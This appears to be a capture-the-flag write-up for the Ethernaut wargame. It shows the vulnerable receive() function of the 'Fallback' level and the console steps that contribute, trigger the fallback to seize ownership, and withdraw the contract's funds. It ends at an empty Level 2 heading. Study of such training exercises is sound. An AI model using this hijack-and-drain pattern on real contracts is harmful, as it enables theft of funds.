# Ethernaut Solutions

## Level 1 - Fallback

Exploiting faulty logic that allows taking posession of the contract. 

```
  // 'fallback' function sets contract owner to msg.sender
  // can be used to take control of the contract
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```

By satisfying the condition in the fallback function, the contract can be hijacked.

```
// Get current contract owner
await contract.owner();

await contract.contribute({ value: 1 });
// use the sendTransaction function to make a call to the contract

// trigger the fallback by sending Ether with no msg.data
await contract.sendTransaction({ value: 1 });

// Get current contract owner (should be your address now)
await contract.owner();

// Call the withdraw function and drain the funds
await contract.withdraw();
```

## Level 2 - Fallout